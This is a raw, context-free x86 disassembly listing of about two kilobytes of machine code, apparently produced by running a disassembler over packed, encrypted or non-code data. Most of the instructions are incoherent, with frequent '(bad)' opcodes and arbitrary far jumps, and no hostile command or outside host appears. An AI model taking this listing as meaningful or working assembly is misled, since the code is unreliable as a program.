  41f8a9:	rcr    eax,1
  41f8ab:	pop    ebx
  41f8ac:	cs sahf 
  41f8ae:	pop    edi
  41f8af:	mov    WORD PTR [edx+0x1a852ef3],fs
  41f8b5:	cmc    
  41f8b6:	mov    ds:0x5589aa0d,eax
  41f8bb:	fld    QWORD PTR [ebx+0x4708c148]
  41f8c1:	shl    BYTE PTR [eax],cl
  41f8c3:	jno    0x41f927
  41f8c5:	cmp    edx,edi
  41f8c7:	pop    edi
  41f8c8:	imul   ecx,ebx,0x63
  41f8cb:	les    esi,FWORD PTR [esi]
  41f8cd:	jecxz  0x41f92c
  41f8cf:	shl    bl,1
  41f8d1:	cmp    DWORD PTR [eax-0x181d9869],eax
  41f8d7:	(bad)  
  41f8d8:	push   ss
  41f8d9:	std    
  41f8da:	cmp    esp,DWORD PTR [edx-0xc5fae91]
  41f8e0:	dec    eax
  41f8e1:	frstor [ecx+0x7d]
  41f8e4:	test   BYTE PTR [ecx+0x7894b73e],bh
  41f8ea:	shl    BYTE PTR [esi+eiz*2-0x6],0xf9
  41f8ef:	sbb    al,bh
  41f8f1:	mov    dh,0xac
  41f8f3:	mov    cs,WORD PTR [edi+0x5]
  41f8f6:	jmp    0xb86cb492
  41f8fb:	dec    ebp
  41f8fc:	test   eax,0x9a22c4a3
  41f901:	xor    BYTE PTR [ebx],bh
  41f903:	(bad)  
  41f904:	mov    esp,0xc5167ee7
  41f909:	add    DWORD PTR [ecx+0x5c22d883],edx
  41f90f:	pop    edx
  41f910:	add    DWORD PTR [edi+0x7512d76c],edi
  41f916:	stos   BYTE PTR es:[edi],al
  41f917:	or     DWORD PTR [edi],0x74
  41f91a:	sub    DWORD PTR ds:0x39da344c,esi
  41f920:	inc    edx
  41f921:	add    eax,0xb4590be6
  41f926:	mov    bh,0x5c
  41f928:	add    ch,BYTE PTR [ebx+0x4]
  41f92b:	mov    dh,0x8e
  41f92d:	repz xchg edi,eax
  41f92f:	aam    0x52
  41f931:	(bad)  
  41f932:	jmp    0x41f8f7
  41f934:	mov    esp,0xc5fd3d28
  41f939:	aam    0xdf
  41f93b:	inc    eax
  41f93c:	pop    edx
  41f93d:	mov    eax,ds:0xb6b38f66
  41f942:	dec    edi
  41f943:	outs   dx,DWORD PTR ds:[esi]
  41f944:	adc    al,0x6b
  41f946:	push   ds
  41f947:	je     0x41f8f2
  41f949:	jnp    0x41f94a
  41f94b:	test   al,0x3e
  41f94d:	(bad)  
  41f94e:	mov    edi,0x1fd16e05
  41f953:	dec    ebx
  41f954:	cwde   
  41f955:	cmp    DWORD PTR [bx+di],ebp
  41f958:	les    edi,FWORD PTR [edx+ebp*2-0x51744d1b]
  41f95f:	call   0xefd4ebd3
  41f964:	and    al,0xbe
  41f966:	mov    edx,0x969f37f0
  41f96b:	sbb    cl,BYTE PTR [edi-0xf635d7e]
  41f971:	out    0x31,ax
  41f974:	hlt    
  41f975:	cli    
  41f976:	fldenv [edx+0x29019aaf]
  41f97c:	xor    cl,BYTE PTR [ebp+0x7ef31754]
  41f982:	(bad)  
  41f983:	aam    0xa3
  41f985:	adc    esi,DWORD PTR [ebp+0x63]
  41f988:	int3   
  41f989:	sub    BYTE PTR [ecx+0x5cf6867b],ah
  41f98f:	pop    eax
  41f990:	dec    ecx
  41f991:	stos   BYTE PTR es:[edi],al
  41f992:	dec    edx
  41f993:	add    dh,dl
  41f995:	pop    edi
  41f996:	fwait
  41f997:	outs   dx,BYTE PTR ds:[esi]
  41f998:	xchg   DWORD PTR [ebp-0x520e4b6f],edx
  41f99e:	(bad)  
  41f99f:	fisub  WORD PTR [ebp+0x37572f14]
  41f9a5:	mov    esp,0xb0106cc
  41f9aa:	out    0xc6,eax
  41f9ac:	adc    DWORD PTR [eax+0xaaf9594],edx
  41f9b2:	jp     0x41f9cd
  41f9b4:	cmp    BYTE PTR [ebp-0x78ec181f],0x23
  41f9bb:	pop    ds
  41f9bc:	pop    esi
  41f9bd:	or     DWORD PTR [esi],0x7b850b67
  41f9c3:	jecxz  0x41f975
  41f9c5:	jnp    0x41f9e7
  41f9c7:	sti    
  41f9c8:	mov    dh,0x23
  41f9ca:	(bad)  
  41f9cb:	iret   
  41f9cc:	ror    ebp,cl
  41f9ce:	push   edx
  41f9cf:	pop    ecx
  41f9d0:	pop    es
  41f9d1:	pop    edx
  41f9d2:	outs   dx,BYTE PTR ds:[esi]
  41f9d3:	sar    DWORD PTR [edi-0x16],0xae
  41f9d7:	pop    ds
  41f9d8:	hlt    
  41f9d9:	inc    esi
  41f9da:	jp     0x41f9c1
  41f9dc:	outs   dx,BYTE PTR ds:[esi]
  41f9dd:	fs in  eax,0x7a
  41f9e0:	push   ebp
  41f9e1:	adc    DWORD PTR [edx],0xffffffbd
  41f9e4:	repz xor BYTE PTR [ebx-0x5a5dea51],0xe4
  41f9ec:	retf   
  41f9ed:	mov    ds:0xcb7b82ff,eax
  41f9f2:	xor    eax,0xcfc3d7a7
  41f9f7:	mov    ebp,0x8856606
  41f9fc:	imul   ebx,DWORD PTR [esi+0x1c068299],0x43460f42
  41fa06:	lea    edx,[esi]
  41fa08:	dec    edx
  41fa09:	ds callw 0x374c
  41fa0e:	xchg   ebp,eax
  41fa0f:	aam    0xc5
  41fa11:	in     eax,dx
  41fa12:	xlat   BYTE PTR gs:[ebx]
  41fa14:	sti    
  41fa15:	jp     0x41fa3a
  41fa17:	sar    DWORD PTR [ecx],1
  41fa19:	jl     0x41f9b4
  41fa1b:	xchg   DWORD PTR [ebp-0x52],ecx
  41fa1e:	xlat   BYTE PTR ds:[ebx]
  41fa1f:	les    esi,FWORD PTR [esi-0x6e]
  41fa22:	sbb    ebx,0x709b557c
  41fa28:	cdq    
  41fa29:	(bad)
  41fa2e:	in     eax,dx
  41fa2f:	cdq    
  41fa30:	fs int3 
  41fa32:	mov    ds:0xef5e5803,al
  41fa37:	xchg   DWORD PTR [ecx],esi
  41fa39:	out    dx,eax
  41fa3a:	jl     0x41fa83
  41fa3c:	cdq    
  41fa3d:	push   ss
  41fa3e:	mov    ch,0xc6
  41fa40:	mov    ds:0x8cc9c873,al
  41fa45:	push   esi
  41fa46:	jbe    0x41f9ef
  41fa48:	or     eax,0x822eb9d2
  41fa4d:	mov    ebx,0x3df3ef06
  41fa52:	inc    ebp
  41fa53:	data16 cmc 
  41fa55:	jnp    0x41faad
  41fa57:	cmp    eax,ebx
  41fa59:	mov    edx,0x3d0a152
  41fa5e:	shr    ecx,1
  41fa60:	or     eax,0xd7000005
  41fa65:	int    0xc4
  41fa67:	ror    edx,1
  41fa69:	(bad)  
  41fa6b:	fstp   DWORD PTR [ebp+0x41aad46c]
  41fa71:	pop    ss
  41fa72:	cli    
  41fa73:	bound  esi,QWORD PTR [edi]
  41fa75:	push   ebx
  41fa76:	jg     0x41faf0
  41fa78:	jae    0x41faf6
  41fa7a:	js     0x41faf4
  41fa7c:	lds    edx,FWORD PTR [edi-0x5875421c]
  41fa82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa83:	fucomip st,st(7)
  41fa85:	stc    
  41fa86:	icebp  
  41fa87:	add    ebp,DWORD PTR [eax+eiz*1]
  41fa8a:	or     esi,ebx
  41fa8c:	cmp    eax,0xada4a05b
  41fa91:	dec    esi
  41fa92:	hlt    
  41fa93:	retf   
  41fa94:	or     BYTE PTR ss:[eax-0x6bb5db2a],ch
  41fa9b:	pushf  
  41fa9c:	clc    
  41fa9d:	sbb    ax,0x2b93
  41faa1:	adc    BYTE PTR [edx+0x6c],bh
  41faa4:	sbb    al,0xc9
  41faa6:	out    dx,eax
  41faa7:	sbb    edx,esp
  41faa9:	or     edi,DWORD PTR [esi-0x7e]
  41faac:	push   ds
  41faad:	je     0x41fb1a
  41faaf:	xor    bh,BYTE PTR ss:[edi]
  41fab2:	mov    WORD PTR [eax-0x70],fs
  41fab5:	dec    edi
  41fab6:	sbb    DWORD PTR [edi],ebx
  41fab8:	retf   0x4537
  41fabb:	cmc    
  41fabc:	es mov bl,0xbc
  41fabf:	rcl    DWORD PTR [esp+eax*2-0x78],0x62
  41fac4:	push   0xa
  41fac6:	push   ecx
  41fac7:	pushf  
  41fac8:	dec    eax
  41fac9:	sbb    ebx,0x48
  41facc:	sub    al,0x37
  41face:	in     eax,0xc4
  41fad0:	push   0x3a59c6eb
  41fad5:	fcomp  QWORD PTR [ecx-0x66255e73]
  41fadb:	pop    ebp
  41fadc:	jmp    0x29a1:0xa0cfa04a
  41fae3:	push   esi
  41fae4:	add    dl,BYTE PTR [edi-0x13]
  41fae7:	sbb    DWORD PTR [ebx],0xe3b40e83
  41faed:	mov    al,0x76
  41faef:	es mov bl,0x10
  41faf2:	and    DWORD PTR [edx+0x63],esi
  41faf5:	push   esp
  41faf6:	xchg   esp,eax
  41faf7:	shr    DWORD PTR [edi+ebx*2-0x145527ee],cl
  41fafe:	adc    dl,BYTE PTR [edx-0x5a]
  41fb01:	cmp    ebp,DWORD PTR [ecx+0x731ca4e2]
  41fb07:	mov    al,0xf5
  41fb09:	lock in eax,0xe6
  41fb0c:	popf   
  41fb0d:	sub    eax,0x2888bae7
  41fb12:	shl    BYTE PTR ss:[eax-0x42],cl
  41fb16:	xchg   ebx,eax
  41fb17:	aam    0xfd
  41fb19:	push   esi
  41fb1a:	cli    
  41fb1b:	push   0x37108e47
  41fb20:	rcl    DWORD PTR [edx-0x6c40aff2],cl
  41fb26:	dec    esp
  41fb27:	inc    edx
  41fb28:	pop    edx
  41fb29:	out    0xac,eax
  41fb2b:	xor    edx,DWORD PTR ds:0xd356f5cb
  41fb31:	or     DWORD PTR [edi-0x3d],ebx
  41fb34:	fld    QWORD PTR [ecx+ebp*4-0x46]
  41fb38:	aas    
  41fb39:	loopne 0x41fb78
  41fb3b:	xlat   BYTE PTR ds:[ebx]
  41fb3c:	jl     0x41fba0
  41fb3e:	jle    0x41fb9d
  41fb40:	sbb    eax,0x7d72fa12
  41fb45:	in     al,0x75
  41fb47:	push   0xd06d4816
  41fb4c:	mov    dh,0x7c
  41fb4e:	dec    esp
  41fb4f:	inc    edx
  41fb50:	mov    edx,DWORD PTR [edx+0x4803c3e4]
  41fb56:	sub    al,al
  41fb58:	cmp    eax,0x970144ef
  41fb5d:	mov    edi,0x6b6d440f
  41fb62:	push   ecx
  41fb63:	test   al,0x9
  41fb65:	adc    ecx,esp
  41fb67:	call   0x8d2660a5
  41fb6c:	btr    DWORD PTR [edx],ecx
  41fb6f:	jns    0x41fb29
  41fb71:	ja     0x41fb90
  41fb73:	mov    cl,0xb0
  41fb75:	push   ebp
  41fb76:	sub    al,0x50
  41fb78:	shl    DWORD PTR [esi+esi*1-0x63],1
  41fb7c:	push   ebx
  41fb7d:	js     0x41fb6f
  41fb7f:	jne    0x41fb69
  41fb81:	int3   
  41fb82:	std    
  41fb83:	ja     0x41fbef
  41fb85:	xor    BYTE PTR [esi],dl
  41fb87:	mov    ch,0xf0
  41fb89:	fcomi  st,st(2)
  41fb8b:	ret    
  41fb8c:	lock add al,0xaa
  41fb8f:	cli    
  41fb90:	mov    eax,ds:0x26db70c6
  41fb95:	jmp    0x41fb7a
  41fb97:	mov    cl,0xc8
  41fb99:	popf   
  41fb9a:	retf   
  41fb9b:	test   al,0xd5
  41fb9d:	out    dx,eax
  41fb9e:	gs call 0x174709d7
  41fba4:	scas   eax,DWORD PTR es:[edi]
  41fba5:	jecxz  0x41fc14
  41fba7:	jmp    0xb2a17c6
  41fbac:	out    dx,eax
  41fbad:	mov    al,0x44
  41fbaf:	and    edx,eax
  41fbb1:	sti    
  41fbb2:	faddp  st(3),st
  41fbb4:	hlt    
  41fbb5:	pop    eax
  41fbb6:	mov    esi,0xab4020f1
  41fbbb:	jnp    0x41fb86
  41fbbd:	les    edi,FWORD PTR [edi+0x799cd274]
  41fbc3:	dec    esp
  41fbc4:	xchg   esp,eax
  41fbc5:	dec    edx
  41fbc6:	sahf   
  41fbc7:	stos   BYTE PTR es:[edi],al
  41fbc8:	fdiv   DWORD PTR ss:[edx+0x57]
  41fbcc:	sub    edx,DWORD PTR [edi-0x1f]
  41fbcf:	mov    ?,WORD PTR [ecx+edi*1-0x49ce3c28]
  41fbd6:	repnz push ebx
  41fbd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbd9:	or     eax,0xb8bc6abf
  41fbde:	jmp    0x250e:0x9d82c34f
  41fbe5:	dec    edx
  41fbe6:	jp     0x41fbf6
  41fbe8:	xchg   DWORD PTR [ebx],esi
  41fbea:	rol    BYTE PTR [edx],cl
  41fbec:	jb     0x41fb8e
  41fbee:	outs   dx,BYTE PTR ds:[esi]
  41fbef:	ss repz jecxz 0x41fbb4
  41fbf3:	rcl    DWORD PTR [ebx],cl
  41fbf5:	jns    0x41fc17
  41fbf7:	(bad)  
  41fbf8:	stc    
  41fbf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbfa:	repnz clc 
  41fbfc:	hlt    
  41fbfd:	fwait
  41fbfe:	outs   dx,DWORD PTR ds:[esi]
  41fbff:	repz (bad) 
  41fc01:	ficom  DWORD PTR [esi+eax*8+0x66]
  41fc05:	outs   dx,DWORD PTR ds:[esi]
  41fc06:	push   esi
  41fc07:	adc    BYTE PTR [esi-0x49a743b9],al
  41fc0d:	stos   BYTE PTR es:[edi],al
  41fc0e:	inc    esp
  41fc0f:	cmp    DWORD PTR [ebp-0x63e2a41f],eax
  41fc15:	(bad)  
  41fc17:	xchg   ecx,eax
  41fc18:	pop    edx
  41fc19:	repnz shr BYTE PTR [ecx],cl
  41fc1c:	sahf   
  41fc1d:	outs   dx,DWORD PTR ds:[esi]
  41fc1e:	popf   
  41fc1f:	les    ebp,FWORD PTR [edx+0x65585106]
  41fc25:	outs   dx,BYTE PTR ds:[esi]
  41fc26:	xlat   BYTE PTR ds:[ebx]
  41fc27:	add    DWORD PTR [esi+0x6e95860],edi
  41fc2d:	sbb    edi,DWORD PTR es:[edx+0x6c]
  41fc31:	std    
  41fc32:	mov    esi,0x6ac6ae7b
  41fc37:	mov    ds:0x4618f39a,eax
  41fc3c:	jge    0x41fc07
  41fc3e:	(bad)  
  41fc3f:	jl     0x41fc8c
  41fc41:	xor    DWORD PTR [ebx],esi
  41fc43:	out    dx,eax
  41fc44:	jle    0x41fc9b
  41fc46:	das    
  41fc47:	jne    0x41fbf2
  41fc49:	pop    ds
  41fc4a:	push   0xe81bbf3c
  41fc4f:	shl    bl,cl
  41fc51:	das    
  41fc52:	lahf   
  41fc53:	and    BYTE PTR [edx-0x77a1283e],cl
  41fc59:	add    BYTE PTR [ebx*2-0x7754b0b],ah
  41fc60:	stos   DWORD PTR es:[edi],eax
  41fc61:	sub    BYTE PTR ds:0x2f4152e7,0xa
  41fc68:	dec    eax
  41fc69:	jbe    0x41fce8
  41fc6b:	pop    ebp
  41fc6c:	cmp    bl,bh
  41fc6e:	cmp    ah,BYTE PTR [edx]
  41fc70:	sahf   
  41fc71:	push   cs
  41fc72:	cmp    al,0x6
  41fc74:	(bad)  
  41fc75:	jne    0x41fcb9
  41fc77:	push   ecx
  41fc78:	push   eax
  41fc79:	aaa    
  41fc7a:	push   ebx
  41fc7b:	pop    ebx
  41fc7c:	mov    ds:0x1a429f93,al
  41fc81:	in     eax,0x82
  41fc83:	femms  
  41fc85:	pop    esi
  41fc86:	nop
  41fc87:	mov    al,0x51
  41fc89:	adc    dl,BYTE PTR [ecx]
  41fc8b:	mov    cl,0xb5
  41fc8d:	arpl   WORD PTR [ebx+ecx*4+0x2ad55a02],ax
  41fc94:	popf   
  41fc95:	sti    
  41fc96:	addr16 push cs
  41fc98:	sub    eax,0xac88b3e8
  41fc9d:	ret    
  41fc9e:	aam    0xa8
  41fca0:	pop    esp
  41fca1:	int3   
  41fca2:	pushf  
  41fca3:	data16 jbe 0x41fca9
  41fca6:	cmc    
  41fca7:	and    BYTE PTR [eax-0x2aa72806],ah
  41fcad:	ins    DWORD PTR es:[edi],dx
  41fcae:	repnz fisubr DWORD PTR [ebx-0x59]
  41fcb2:	push   ecx
  41fcb3:	ins    DWORD PTR es:[edi],dx
  41fcb4:	aas    
  41fcb5:	fucomi st,st(6)
  41fcb7:	dec    eax
  41fcb8:	stos   BYTE PTR es:[edi],al
  41fcb9:	neg    DWORD PTR [esi-0x14]
  41fcbc:	rcl    DWORD PTR [edi-0x3644d1c2],1
  41fcc2:	(bad)  
  41fcc3:	(bad)  
  41fcc4:	mov    eax,0x4112cbea
  41fcc9:	mov    esp,0x7dae43c
  41fcce:	cli    
  41fccf:	adc    eax,DWORD PTR [esi-0x518bb98e]
  41fcd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcd6:	in     eax,dx
  41fcd7:	pop    esi
  41fcd8:	in     eax,0x73
  41fcda:	cdq    
  41fcdb:	jle    0x41fc79
  41fcdd:	jge    0x41fca3
  41fcdf:	repz push ds
  41fce1:	fmul   st,st(3)
  41fce3:	mov    al,ds:0xfbd802aa
  41fce8:	scas   eax,DWORD PTR es:[edi]
  41fce9:	jno    0x41fcf4
  41fceb:	es push eax
  41fced:	jmp    0x6441:0xb7b6a3ef
  41fcf4:	and    al,0x80
  41fcf6:	int    0x4d
  41fcf8:	xor    DWORD PTR [ebp+0x10c5ef18],esi
  41fcfe:	cmp    eax,0xf2b5aec4
  41fd03:	ror    ebx,1
  41fd05:	sub    eax,0x4596c601
  41fd0a:	cmp    BYTE PTR [ebp-0x45cca2f3],0xa5
  41fd11:	retf   0xa34c
  41fd14:	rcl    DWORD PTR cs:[eax+0x1d],cl
  41fd18:	in     eax,dx
  41fd19:	jo     0x41fcaf
  41fd1b:	and    al,0x32
  41fd1d:	mov    bh,0xbc
  41fd1f:	aam    0x15
  41fd21:	fimul  WORD PTR [edi]
  41fd23:	and    eax,0x5644f21c
  41fd28:	push   ds
  41fd29:	repz daa 
  41fd2b:	cmp    dh,BYTE PTR [eax*2-0x220fdf4b]
  41fd32:	adc    BYTE PTR [ebp+0x74],0x47
  41fd36:	dec    esp
  41fd37:	sub    DWORD PTR [ecx-0x1e],eax
  41fd3a:	je     0x41fd63
  41fd3c:	out    0xef,eax
  41fd3e:	lods   al,BYTE PTR ds:[esi]
  41fd3f:	pop    ss
  41fd40:	inc    esp
  41fd41:	mov    esp,0xa68e5992
  41fd46:	cmp    bh,bl
  41fd48:	dec    ecx
  41fd49:	sbb    dh,bl
  41fd4b:	xor    esp,0xffffffcc
  41fd4e:	imul   ebx,DWORD PTR [ebx],0xcf485c8d
  41fd54:	pop    ecx
  41fd55:	add    edx,DWORD PTR [edx-0xe9fcff7]
  41fd5b:	or     eax,0xdb3d70a4
  41fd60:	out    dx,eax
  41fd61:	and    edi,DWORD PTR [ebx+0x2d9bb7d7]
  41fd67:	mov    esp,DWORD PTR es:[ebx-0x61]
  41fd6b:	out    dx,eax
  41fd6c:	sbb    DWORD PTR [ebx],ecx
  41fd6e:	mov    cl,0x3
  41fd70:	fldpi  
  41fd72:	shl    ebp,1
  41fd74:	adc    BYTE PTR [ebx-0x70],al
  41fd77:	jns    0x41fd1f
  41fd79:	(bad)  
  41fd7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd7b:	cwde   
  41fd7c:	or     DWORD PTR [ecx+0x53b00690],edx
  41fd82:	cmp    edx,DWORD PTR [edx+0x72]
  41fd85:	xor    DWORD PTR ds:0x83ecee5,edi
  41fd8b:	ficom  DWORD PTR [ebx]
  41fd8d:	pop    esp
  41fd8e:	mov    dh,dh
  41fd90:	imul   eax,DWORD PTR [ecx+edx*4+0x5264b394],0xd6c7e3da
  41fd9b:	dec    esi
  41fd9c:	stc    
  41fd9d:	push   0x5b
  41fd9f:	xor    DWORD PTR [ebp-0x38e33399],eax
  41fda5:	outs   dx,DWORD PTR ds:[esi]
  41fda6:	cmp    DWORD PTR [ebp*1-0x3c3ca042],eax
  41fdad:	iret   
  41fdae:	shl    DWORD PTR ds:0x355354ed,cl
  41fdb4:	sub    dl,BYTE PTR [edx]
  41fdb6:	aad    0x82
  41fdb8:	and    DWORD PTR [eax+0x24],0xe94af56f
  41fdbf:	dec    ebp
  41fdc0:	xchg   esp,eax
  41fdc1:	adc    BYTE PTR [ecx],0xed
  41fdc4:	pop    ebx
  41fdc5:	rcr    DWORD PTR [edx],0x32
  41fdc8:	iret   
  41fdc9:	xlat   BYTE PTR ds:[ebx]
  41fdca:	lahf   
  41fdcb:	nop
  41fdcc:	(bad)  [ebx]
  41fdce:	cmp    ebp,DWORD PTR [edx]
  41fdd0:	loop   0x41fd63
  41fdd2:	repz xor bh,BYTE PTR [esi-0x408d4e64]
  41fdd9:	xor    cl,al
  41fddb:	outs   dx,DWORD PTR ds:[esi]
  41fddc:	pop    ebx
  41fddd:	or     esp,DWORD PTR [ecx]
  41fddf:	jnp    0x41fe27
  41fde1:	xchg   ebx,eax
  41fde2:	rol    ch,0x8d
  41fde5:	add    edx,DWORD PTR [ebp+0x415b51b]
  41fdeb:	ds pop ds
  41fded:	or     al,BYTE PTR [edx]
  41fdef:	pop    esi
  41fdf0:	cld    
  41fdf1:	(bad)
  41fdf6:	or     DWORD PTR [edi+esi*8+0x1b],esi
  41fdfa:	or     BYTE PTR [edi+eax*8+0x19db3445],bh
  41fe01:	loope  0x41fd88
  41fe03:	mov    eax,0x2c9922eb
  41fe08:	loopne 0x41fdff
  41fe0a:	out    dx,al
  41fe0b:	idiv   DWORD PTR [esi-0x365d2678]
  41fe11:	js     0x41fe6e
  41fe13:	cmp    BYTE PTR [ebx-0x34],dl
  41fe16:	sbb    ah,bh
  41fe18:	push   es
  41fe19:	nop
  41fe1a:	adc    BYTE PTR [edi+edx*2-0x78d0b5e2],bh
  41fe21:	push   ss
  41fe22:	xlat   BYTE PTR ds:[ebx]
  41fe23:	loope  0x41fdf5
  41fe25:	push   DWORD PTR [edx]
  41fe27:	pop    ebp
  41fe28:	loope  0x41fe3d
  41fe2a:	call   0x2fc15254
  41fe2f:	xchg   BYTE PTR [edi+0x59],bh
  41fe32:	sbb    al,0x19
  41fe34:	mov    ebp,0xebe6e61b
  41fe39:	fidiv  DWORD PTR [ebx+ebx*1]
  41fe3c:	xlat   BYTE PTR ds:[ebx]
  41fe3d:	or     BYTE PTR [ebp+ebp*4-0x12e42edb],al
  41fe44:	pop    ss
  41fe45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe46:	pop    ebx
  41fe48:	cld    
  41fe49:	cwde   
  41fe4a:	ja     0x41fdf8
  41fe4c:	cmp    ecx,ecx
  41fe4e:	aas    
  41fe4f:	mov    al,0xa8
  41fe51:	ret    0x9a5b
  41fe54:	adc    al,0xca
  41fe56:	xchg   ebp,eax
  41fe57:	jp     0x41fe64
  41fe59:	lods   eax,DWORD PTR ds:[esi]
  41fe5b:	cld    
  41fe5c:	push   esp
  41fe5d:	adc    BYTE PTR [ecx+0x5583b611],dl
  41fe63:	mov    eax,0x7787a57d
  41fe68:	add    BYTE PTR [ebx+0x730358ea],ch
  41fe6e:	pop    eax
  41fe6f:	inc    edi
  41fe70:	stos   DWORD PTR es:[edi],eax
  41fe71:	mov    cl,0x40
  41fe73:	push   0xffffffe1
  41fe75:	retf   
  41fe76:	pop    edx
  41fe77:	sbb    DWORD PTR [ecx-0x6],edx
  41fe7a:	mov    ds:0x607f8b99,eax
  41fe7f:	push   0xffffffc7
  41fe81:	ror    DWORD PTR [ecx],1
  41fe83:	pop    ss
  41fe84:	pop    edi
  41fe85:	lea    eax,[ebx]
  41fe87:	mov    ebp,ebx
  41fe89:	mov    al,ds:0x57b7c16
  41fe8e:	sub    ecx,DWORD PTR [ecx+0x25b6b6c9]
  41fe94:	ret    0xb7af
  41fe97:	pop    esi
  41fe98:	mov    dh,0xd1
  41fe9a:	cli    
  41fe9b:	pop    ds
  41fe9c:	(bad)  
  41fe9d:	jmp    0x41fe2c
  41fe9f:	push   esi
  41fea0:	adc    BYTE PTR [edi-0x50],ah
  41fea3:	out    0x15,al
  41fea5:	xchg   ebp,eax
  41fea6:	(bad)  
  41fea7:	cmp    dh,BYTE PTR [eax+0x7e]
  41feaa:	pushf  
  41feab:	mov    bl,0xb1
  41fead:	xchg   edx,eax
  41feae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feaf:	fsub   QWORD PTR [esp+edx*8+0x5364c715]
  41feb6:	les    edx,FWORD PTR [esi+0x1c]
  41feb9:	jbe    0x41fef0
  41febb:	jnp    0x41fe70
  41febd:	adc    DWORD PTR [ebx+esi*8],ebx
  41fec0:	dec    ecx
  41fec1:	pop    eax
  41fec2:	or     al,0x5b
  41fec4:	aaa    
  41fec5:	adc    eax,0x9e1f3853
  41feca:	jbe    0x41fee7
  41fecc:	das    
  41fecd:	test   DWORD PTR [ecx+0x25c407a1],edi
  41fed3:	stc    
  41fed4:	fwait
  41fed5:	pop    esi
  41fed6:	ins    BYTE PTR es:[edi],dx
  41fed7:	mov    ds:0x4f012152,al
  41fedc:	test   DWORD PTR [ebp-0x6d9043fe],esp
  41fee2:	xor    DWORD PTR [edx],eax
  41fee4:	scas   al,BYTE PTR es:[edi]
  41fee5:	sub    ebp,DWORD PTR [ebx-0x77d1928b]
  41feeb:	dec    ecx
  41feec:	mov    al,0xa9
  41feee:	sbb    BYTE PTR [esi],dl
  41fef0:	adc    al,0xf2
  41fef2:	ds (bad) 
  41fef4:	(bad)  
  41fef5:	call   0x5c219b81
  41fefa:	js     0x41ff79
  41fefc:	dec    ecx
  41fefd:	xchg   DWORD PTR [esi],edx
  41feff:	mov    ds:0x4f0a9db5,eax
  41ff04:	mov    cl,0x60
  41ff06:	div    BYTE PTR [ebx+0x19]
  41ff09:	and    eax,0xf09cfd91
  41ff0e:	cmp    eax,0xcee35246
  41ff13:	push   ebx
  41ff14:	les    edx,FWORD PTR [eax+ecx*4]
  41ff17:	xchg   ebp,eax
  41ff18:	and    al,0x13
  41ff1a:	lahf   
  41ff1b:	cmp    BYTE PTR [edx-0x4db923d7],ch
  41ff21:	or     eax,0xb481ec93
  41ff26:	retf   0xf859
  41ff29:	xor    esp,esp
  41ff2b:	pop    es
  41ff2c:	push   es
  41ff2d:	add    al,0xb9
  41ff2f:	adc    al,cl
  41ff31:	shl    ebx,cl
  41ff33:	jmp    0x41ffb2
  41ff35:	inc    ecx
  41ff36:	push   es
  41ff37:	push   ebp
  41ff38:	(bad)  
  41ff39:	cld    
  41ff3a:	test   al,0x19
  41ff3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff3d:	hlt    
  41ff3e:	xchg   DWORD PTR [eax],edx
  41ff40:	dec    ebp
  41ff41:	jle    0x41ff86
  41ff43:	(bad)  
  41ff44:	push   ss
  41ff45:	mov    dl,0xa5
  41ff47:	fs xchg esp,eax
  41ff49:	push   esp
  41ff4a:	lods   al,BYTE PTR ds:[esi]
  41ff4b:	cmp    al,0x7d
  41ff4d:	mov    bh,0x13
  41ff4f:	fs scas eax,DWORD PTR es:[edi]
  41ff51:	push   ebp
  41ff52:	mov    ebx,0xfada25bf
  41ff57:	xchg   ch,ah
  41ff59:	iret   
  41ff5a:	adc    BYTE PTR [ebp+0xa],ch
  41ff5d:	ins    BYTE PTR es:[edi],dx
  41ff5e:	(bad)  
  41ff5f:	or     bh,dh
  41ff61:	mov    eax,0x8e5d1f6c
  41ff66:	fstp   st(0)
  41ff68:	out    0x30,al
  41ff6a:	mov    BYTE PTR [edi+0x79427919],al
  41ff70:	and    DWORD PTR [edi],ecx
  41ff72:	scas   eax,DWORD PTR es:[edi]
  41ff73:	xlat   BYTE PTR ds:[ebx]
  41ff74:	mov    edi,DWORD PTR [ebp-0x8]
  41ff77:	mov    ebx,DWORD PTR [ebp-0x10]
  41ff7a:	sub    ebx,edi
  41ff7c:	cmp    ebx,edx
  41ff7e:	jmp    0x420490
  41ff83:	rcl    bh,1
  41ff85:	ror    ebp,1
  41ff87:	rcr    ecx,1
  41ff89:	aam    0xd5
  41ff8b:	pop    edx
  41ff8c:	inc    esi
  41ff8d:	daa    
  41ff8e:	clc    
  41ff8f:	pop    ds
  41ff90:	dec    esp
  41ff91:	popf   
  41ff92:	loope  0x41ffbe
  41ff94:	push   esi
  41ff95:	jg     0x42000f
  41ff97:	jae    0x420015
  41ff99:	js     0x420013
  41ff9b:	push   es
  41ff9c:	ja     0x41ff39
  41ff9e:	sub    eax,0x18179cf9
  41ffa3:	xor    ecx,DWORD PTR [ebp-0xe]
  41ffa6:	and    ah,cl
  41ffa8:	(bad)  
  41ffa9:	jno    0x420020
  41ffab:	push   es
  41ffac:	mov    bl,0x7f
  41ffae:	dec    BYTE PTR [ebp*8-0x125af67d]
  41ffb5:	ja     0x41ff43
  41ffb7:	cwde   
  41ffb8:	ins    BYTE PTR es:[edi],dx
  41ffb9:	fidivr DWORD PTR [ebp-0x683260f6]
  41ffbf:	aam    0xec
  41ffc1:	mov    eax,esp
  41ffc3:	push   esp
  41ffc4:	xchg   ebx,eax
  41ffc5:	push   ecx
  41ffc6:	in     al,0xa0
  41ffc8:	enter  0x819c,0xda
  41ffcc:	pushf  
  41ffcd:	call   0x53c7:0x62aa8bdc
  41ffd4:	hlt    
  41ffd5:	loopne 0x41ff58
  41ffd7:	ficomp DWORD PTR [edx+esi*1-0x33c514e1]
  41ffde:	mov    edi,esp
  41ffe0:	fist   DWORD PTR [edx]
  41ffe2:	dec    eax
  41ffe3:	jbe    0x41ffe2
  41ffe5:	pop    edi
  41ffe6:	push   cs
  41ffe7:	dec    ebp
  41ffe8:	arpl   WORD PTR ds:0x5bd20af1,dx
  41ffee:	ins    DWORD PTR es:[edi],dx
  41ffef:	xchg   esi,eax
  41fff0:	inc    edi
